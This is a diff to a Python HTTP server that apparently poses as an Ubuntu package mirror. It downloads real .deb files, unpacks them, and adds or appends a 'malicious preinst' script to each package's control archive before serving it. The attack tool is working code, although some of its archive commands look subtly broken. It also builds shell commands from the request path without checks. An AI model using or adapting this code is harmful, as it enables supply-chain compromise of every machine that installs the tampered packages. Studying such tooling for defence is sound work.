@@ -12,26 +12,35 @@ class Server(BaseHTTPRequestHandler):
         print("request:", self.path)
         if "ubuntu/pool" in self.path:
             r = requests.get(base_url + self.path)
-            print(type(r))
-            print(r.headers)
+
+            # print(r.headers)
+
             self.send_response(200)
             for header in r.headers.keys():
                 self.send_header(header, r.headers[header])
             self.end_headers()
 
-            package = self.path.split("/")[-1]
+            package_filename = self.path.split("/")[-1]
+
+            # create the deb file
+            try:
+                package = open(package_filename, "xb")
+                package.write(r.content)
+                package.close()
+            except FileExistsError:
+                pass
 
             # extract deb files
-            os.system("ar x {} --output extracting_area".format(package))
+            os.system("ar x {} --output extracting_area".format(package_filename))
 
             # unzip control
-            os.system("gunzip {}/control.tar.gzip".format(package))
-            os.system("tar x {}/control.tar".format(package))
+            os.system("gunzip {}/control.tar.gzip".format(package_filename))
+            os.system("tar x {}/control.tar".format(package_filename))
 
             # checks whether preinst exists already
-            if(not os.path.exists("{}/control.tar/preinst".format(package))):
+            if(not os.path.exists("{}/control.tar/preinst".format(package_filename))):
                 # add malicious preinst
-                os.system("tar rf {}/control.tar preinst".format(package))
+                os.system("tar rf {}/control.tar preinst".format(package_filename))
             # if preinst already exists copy created preinst into the exisiting one
             else:
                 w_preinst = open("preinst", "w")
@@ -44,12 +53,12 @@ class Server(BaseHTTPRequestHandler):
                 w_preinst.close()
 
             # zip control
-            os.system("gzip {}/control.tar.gzip".format(package))
+            os.system("gzip {}/control.tar.gzip".format(package_filename))
 
             # add control back to the deb
-            os.system("ar r ./test/control.tar.gz {}.deb".format(package))
+            os.system("ar r ./test/control.tar.gz {}.deb".format(package_filename))
 
-            f = open("{}.deb".format(package), "rb")
+            f = open("{}".format(package_filename), "rb")
             content = f.read()
 
             # if python 3 - bytes(content)
